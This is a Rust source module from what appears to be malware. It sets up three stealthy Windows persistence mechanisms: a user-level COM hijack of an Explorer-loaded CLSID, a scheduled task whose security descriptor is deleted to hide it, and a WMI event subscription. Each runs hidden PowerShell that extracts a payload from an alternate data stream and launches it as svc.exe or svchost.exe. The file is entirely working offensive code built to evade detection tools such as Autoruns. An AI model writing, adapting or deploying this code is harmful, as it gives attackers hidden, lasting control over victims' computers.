//! # Persistence (COM Hijacking + Hidden Task + WMI)
//!
//! User-mode persistence via COM Hijacking.
//! No admin required, invisible to Autoruns.
//!
//! ## Technique
//! 1. Find COM objects loaded by explorer.exe
//! 2. Create HKCU\Software\Classes\CLSID\{GUID}\InProcServer32
//! 3. Windows reads HKCU before HKLM - our DLL gets loaded

use std::process::Command;
use log::{info, warn, debug};

// ============================================================================
// ADS PATH
// ============================================================================

/// Get the ADS path where payload is stored
fn get_payload_path() -> String {
    r"C:\Users\Public\Libraries\collection.dat:Zone.Identifier".to_string()
}

// ============================================================================
// PERSISTENCE TRIAD
// ============================================================================

/// Apply all three persistence mechanisms
pub fn apply_persistence_triad(loader_path: &str) {
    info!("[Persistence] Applying Persistence Triad...");
    
    setup_com_hijacking(loader_path);
    setup_hidden_scheduled_task(loader_path);
    setup_wmi_subscription(loader_path);
    
    info!("[Persistence] Triad complete");
}

// ============================================================================
// 1. COM HIJACKING (User-Mode, No Admin)
// ============================================================================

/// Hijack CLSID loaded by Explorer
fn setup_com_hijacking(loader_path: &str) {
    info!("[Persistence] Setting up COM Hijacking...");
    
    // Icon Overlay Handlers - loaded by explorer.exe
    let target_clsid = "{b5f8350b-0548-48b1-a6ee-88bd00b4a5da}";
    
    // Build loader command that extracts from ADS
    let loader = format!(
        r#"powershell -WindowStyle Hidden -Command "Get-Content -Path '{}' -Stream 'Zone.Identifier' -Raw | Set-Content -Path $env:TEMP\svc.exe -Encoding Byte; Start-Process $env:TEMP\svc.exe""#,
        loader_path.replace(":", "").replace("\\Zone.Identifier", "")
    );
    
    let script = format!(r#"
$CLSID = "{clsid}"
$BasePath = "HKCU:\Software\Classes\CLSID\$CLSID"
$LocalServerPath = "$BasePath\LocalServer32"

if (!(Test-Path $BasePath)) {{ New-Item -Path $BasePath -Force | Out-Null }}
if (!(Test-Path $LocalServerPath)) {{ New-Item -Path $LocalServerPath -Force | Out-Null }}

Set-ItemProperty -Path $LocalServerPath -Name "(Default)" -Value '{loader}'
"#,
        clsid = target_clsid,
        loader = loader.replace("'", "''")
    );
    
    run_powershell(&script);
}

// ============================================================================
// 2. HIDDEN SCHEDULED TASK
// ============================================================================

/// Create task then remove Security Descriptor to hide from Task Scheduler GUI
fn setup_hidden_scheduled_task(loader_path: &str) {
    info!("[Persistence] Setting up Hidden Scheduled Task...");
    
    let task_name = "WindowsCacheCleanup";
    
    let cmd = format!(
        r#"powershell -WindowStyle Hidden -Command "Get-Content -LiteralPath '{}' -Stream 'Zone.Identifier' -Raw | Set-Content -Path $env:TEMP\svchost.exe -Encoding Byte -Force; Start-Process $env:TEMP\svchost.exe -WindowStyle Hidden""#,
        loader_path.replace(":", "").replace("\\Zone.Identifier", "")
    );
    
    // Create task
    let _ = Command::new("schtasks")
        .args(["/Create", "/F", "/TN", task_name, "/TR", &cmd, "/SC", "ONLOGON", "/RL", "HIGHEST"])
        .output();
    
    // Hide by removing SD
    let hide_script = format!(r#"
$TaskPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\{}"
if (Test-Path $TaskPath) {{
    Remove-ItemProperty -Path $TaskPath -Name "SD" -ErrorAction SilentlyContinue
}}
"#, task_name);
    
    run_powershell(&hide_script);
}

// ============================================================================
// 3. WMI EVENT SUBSCRIPTION
// ============================================================================

/// Fileless persistence via WMI - triggers 5 min after boot
fn setup_wmi_subscription(loader_path: &str) {
    info!("[Persistence] Setting up WMI Event Subscription...");
    
    let filter_name = "WindowsHealthMonitor";
    let consumer_name = "HealthConsumer";
    
    let wql = r#"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime < 360"#;
    
    let cmd = format!(
        r#"powershell -WindowStyle Hidden -Command "Get-Content -LiteralPath '{}' -Stream 'Zone.Identifier' -Raw | Set-Content -Path $env:TEMP\svc.exe -Encoding Byte; Start-Process $env:TEMP\svc.exe""#,
        loader_path.replace(":", "").replace("\\Zone.Identifier", "")
    );
    
    let script = format!(r#"
$ErrorActionPreference = 'SilentlyContinue'
$FilterName = '{filter}'
$ConsumerName = '{consumer}'

Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name='$FilterName'" | Remove-WmiObject
Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name='$ConsumerName'" | Remove-WmiObject
Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding | Where-Object {{ $_.Filter -match $FilterName }} | Remove-WmiObject

$Filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{{
    Name = $FilterName
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = '{wql}'
}}

$Consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{{
    Name = $ConsumerName
    CommandLineTemplate = '{cmd}'
}}

Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{{
    Filter = $Filter
    Consumer = $Consumer
}}
"#,
        filter = filter_name,
        consumer = consumer_name,
        wql = wql,
        cmd = cmd.replace("'", "''")
    );
    
    run_powershell(&script);
}

// ============================================================================
// HELPER
// ============================================================================

fn run_powershell(script: &str) {
    match Command::new("powershell")
        .args(["-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", script])
        .output()
    {
        Ok(output) => {
            if !output.status.success() {
                warn!("[Persistence] PowerShell: {}", String::from_utf8_lossy(&output.stderr));
            }
        }
        Err(e) => warn!("[Persistence] Failed to run PowerShell: {}", e),
    }
}
